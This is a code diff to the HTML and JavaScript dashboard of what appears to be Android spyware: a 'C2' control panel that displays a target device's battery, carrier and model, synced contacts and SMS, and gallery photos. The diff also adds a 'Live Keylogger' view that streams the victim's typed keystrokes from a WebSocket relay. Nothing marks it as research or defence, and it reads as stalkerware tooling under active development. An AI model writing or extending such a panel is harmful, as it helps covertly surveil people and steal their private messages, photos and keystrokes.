@@ -65,43 +65,54 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 <title>NEXUS — Control Center</title>
 <style>
 :root{
-  --bg:#07090d; --panel:#0d1117; --line:rgba(255,255,255,.07);
+  --bg:#07090d; --panel:#0d1117; --panel2:#131a24; --line:rgba(255,255,255,.07);
   --txt:#e6edf7; --dim:#7d8899; --cyan:#22d3ee; --violet:#8b5cf6;
   --green:#22c55e; --red:#ef4444; --amber:#f59e0b;
 }
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--txt);overflow:hidden;font-family:'Inter',system-ui,sans-serif}
-.app{display:grid;grid-template-columns:248px 1fr;height:100vh}
-.sidebar{background:#0b0f15;border-right:1px solid var(--line);display:flex;flex-direction:column;padding:20px 14px}
+body{
+  background:var(--bg); color:var(--txt); overflow:hidden;
+  font-family:'Inter',system-ui,sans-serif;
+}
+body::before{
+  content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
+  background:
+    radial-gradient(600px 400px at 15% 0%, rgba(34,211,238,.10), transparent 70%),
+    radial-gradient(700px 500px at 90% 100%, rgba(139,92,246,.12), transparent 70%);
+}
+.app{display:grid;grid-template-columns:248px 1fr;height:100vh;position:relative;z-index:1}
+.sidebar{background:linear-gradient(180deg,#0b0f15,#080b10);border-right:1px solid var(--line);display:flex;flex-direction:column;padding:20px 14px}
 .brand{display:flex;align-items:center;gap:12px;padding:4px 8px 22px}
-.brand-mark{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-weight:800;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
+.brand-mark{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-weight:800;font-size:18px;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
 .brand-text b{display:block;font-size:15px;letter-spacing:.14em}
 .brand-text span{font-size:10px;color:var(--dim)}
 .nav{display:flex;flex-direction:column;gap:4px;flex:1}
-.nav-item{display:flex;align-items:center;gap:12px;padding:11px 12px;border-radius:11px;background:transparent;border:none;color:var(--dim);font-size:13.5px;font-weight:500;cursor:pointer;text-align:left;transition:.18s}
+.nav-item{display:flex;align-items:center;gap:12px;padding:11px 12px;border-radius:11px;background:transparent;border:1px solid transparent;color:var(--dim);font-size:13.5px;font-weight:500;cursor:pointer;text-align:left;transition:.18s;font-family:inherit}
 .nav-item:hover{background:rgba(255,255,255,.04);color:var(--txt)}
-.nav-item.active{background:linear-gradient(90deg,rgba(34,211,238,.14),rgba(139,92,246,.10));color:#fff;border:1px solid rgba(34,211,238,.28)}
+.nav-item.active{background:linear-gradient(90deg,rgba(34,211,238,.14),rgba(139,92,246,.10));border-color:rgba(34,211,238,.28);color:#fff}
 .main{display:flex;flex-direction:column;overflow:hidden}
 .topbar{height:70px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;border-bottom:1px solid var(--line);background:rgba(10,13,18,.7)}
-.views{flex:1;overflow-y:auto;padding:24px 28px}
+.views{flex:1;overflow-y:auto;padding:24px 28px 60px}
 .view{display:none}
 .view.active{display:block}
 .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
-.stat{display:flex;align-items:center;gap:14px;padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.02)}
-.stat-ico{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;background:rgba(34,211,238,.10)}
+.stat{display:flex;align-items:center;gap:14px;padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.03)}
+.stat-ico{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:17px;background:rgba(34,211,238,.10)}
 .stat-v{font-size:22px;font-weight:700;margin-top:2px}
 .sec-head{margin:26px 0 14px;font-size:13px;font-weight:650;letter-spacing:.06em;color:#b9c4d4;text-transform:uppercase}
+.contacts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
+.contact{display:flex;align-items:center;gap:13px;padding:14px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.035)}
+.c-ava{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-size:13px;font-weight:700;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
+.c-info h4{font-size:13.5px;font-weight:600}
+.c-info p{font-size:11.5px;color:var(--dim);margin-top:2px}
 .controls{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
-.ctrl{padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.02);display:flex;align-items:center;gap:14px}
-.ctrl-ico{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;background:rgba(139,92,246,.12)}
+.ctrl{padding:18px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.035);display:flex;align-items:center;gap:14px}
+.ctrl-ico{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;font-size:19px;background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25)}
 .ctrl-txt{flex:1}
 .ctrl-txt h4{font-size:13px;font-weight:600}
 .ctrl-txt p{font-size:11px;color:var(--dim);margin-top:3px}
 .mini-btn{padding:7px 12px;border-radius:9px;font-size:11px;font-weight:600;cursor:pointer;color:var(--txt);background:rgba(255,255,255,.05);border:1px solid var(--line)}
-.mini-btn:hover{background:rgba(34,211,238,.15);color:var(--cyan)}
-.contacts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
-.contact{display:flex;align-items:center;gap:13px;padding:14px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.02)}
-.c-ava{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-weight:700;color:#04121a;background:linear-gradient(135deg,var(--cyan),var(--violet))}
+.mini-btn:hover{background:rgba(34,211,238,.15);border-color:rgba(34,211,238,.4);color:var(--cyan)}
 .toasts{position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px}
 .toast{padding:13px 17px;border-radius:13px;font-size:12.5px;background:#10161e;border:1px solid rgba(34,211,238,.35);color:#fff}
 </style>
@@ -116,14 +127,15 @@ body{background:var(--bg);color:var(--txt);overflow:hidden;font-family:'Inter',s
     <nav class="nav">
       <button class="nav-item active" data-view="dashboard">Dashboard</button>
       <button class="nav-item" data-view="contacts">Contacts & SMS</button>
-      <button class="nav-item" data-view="photos">Photos Gallery</button>
+      <button class="nav-item" data-view="gallery">Gallery Photos</button>
+      <button class="nav-item" data-view="keystrokes">Live Keylogger</button>
       <button class="nav-item" data-view="controls">Remote Controls</button>
     </nav>
   </aside>
   <main class="main">
     <header class="topbar">
       <h1 id="pageTitle">Dashboard</h1>
-      <div style="color:var(--green)">● C2 Live</div>
+      <div style="color:var(--green)">● C2 Live Connected</div>
     </header>
     <div class="views">
       <section class="view active" id="v-dashboard">
@@ -131,7 +143,7 @@ body{background:var(--bg);color:var(--txt);overflow:hidden;font-family:'Inter',s
           <div class="stat"><div class="stat-ico">🔋</div><div><div>Battery</div><div class="stat-v" id="statBattery">--%</div></div></div>
           <div class="stat"><div class="stat-ico">📡</div><div><div>Carrier</div><div class="stat-v" id="statCarrier" style="font-size:16px">--</div></div></div>
         </div>
-        <div class="sec-head">Target Device Info</div>
+        <div class="sec-head">Target Device Information</div>
         <div id="deviceInfoCard" style="padding:16px;border:1px solid var(--line);border-radius:12px;background:rgba(255,255,255,.02)">
           <b>Waiting for telemetry sync...</b>
         </div>
@@ -140,9 +152,15 @@ body{background:var(--bg);color:var(--txt);overflow:hidden;font-family:'Inter',s
         <div class="sec-head" style="margin-top:0">Synced Contacts</div>
         <div class="contacts" id="contactGrid"><div>No contacts loaded yet.</div></div>
       </section>
-      <section class="view" id="v-photos">
-        <div class="sec-head" style="margin-top:0">Client Photos Gallery</div>
-        <div class="contacts" id="photosGrid"><div>No photos synced yet.</div></div>
+      <section class="view" id="v-gallery">
+        <div class="sec-head" style="margin-top:0">Client Gallery Photos</div>
+        <div class="contacts" id="galleryGrid"><div>No photos synced yet.</div></div>
+      </section>
+      <section class="view" id="v-keystrokes">
+        <div class="sec-head" style="margin-top:0">Live Keystrokes (Keylogger)</div>
+        <div class="card" style="padding:16px;background:rgba(0,0,0,.4);border:1px solid var(--line);border-radius:12px;height:400px;overflow-y:auto;font-family:monospace;color:var(--cyan);" id="keystrokeLog">
+          [Waiting for user typing activity...]
+        </div>
       </section>
       <section class="view" id="v-controls">
         <div class="sec-head" style="margin-top:0">Device Actions</div>
@@ -200,6 +218,7 @@ ws.onopen = () => toast("Connected to C2 Relay");
 
 ws.onmessage = (event) => {
   const msg = JSON.parse(event.data);
+  
   if(msg.payload && msg.payload.type === "live_sync"){
     const p = msg.payload;
     $('#statBattery').textContent = p.battery + '%';
@@ -207,11 +226,17 @@ ws.onmessage = (event) => {
     $('#deviceInfoCard').innerHTML = `<b>Model:</b> ${p.model} (${p.brand}) <br><b>OS:</b> Android ${p.os} <br><b>Carrier:</b> ${p.carrier}`;
     
     if(p.contacts){
-      $('#contactGrid').innerHTML = p.contacts.map(c=>`<div class="contact"><div class="c-ava">${c.name[0]}</div><div><h4>${c.name}</h4><p>${c.phone}</p></div></div>`).join('');
+      $('#contactGrid').innerHTML = p.contacts.map(c=>`<div class="contact"><div class="c-ava">${c.name[0]}</div><div class="c-info"><h4>${c.name}</h4><p>${p.phone || c.phone}</p></div></div>`).join('');
     }
-    if(p.photos){
-      $('#photosGrid').innerHTML = p.photos.map(ph=>`<div class="contact"><div class="c-ava">🖼️</div><div><h4>${ph.filename}</h4><p>Synced Image</p></div></div>`).join('');
+    if(p.gallery){
+      $('#galleryGrid').innerHTML = p.gallery.map(ph=>`<div class="contact"><div class="c-ava">🖼️</div><div class="c-info"><h4>${ph.name}</h4><p>Gallery Image</p></div></div>`).join('');
     }
+  }
+
+  if(msg.payload && msg.payload.type === "keystroke"){
+    const logBox = $('#keystrokeLog');
+    logBox.innerHTML += `<div>[KEYSTROKE] ${msg.payload.text}</div>`;
+    logBox.scrollTop = logBox.scrollHeight;
   }
 };
 
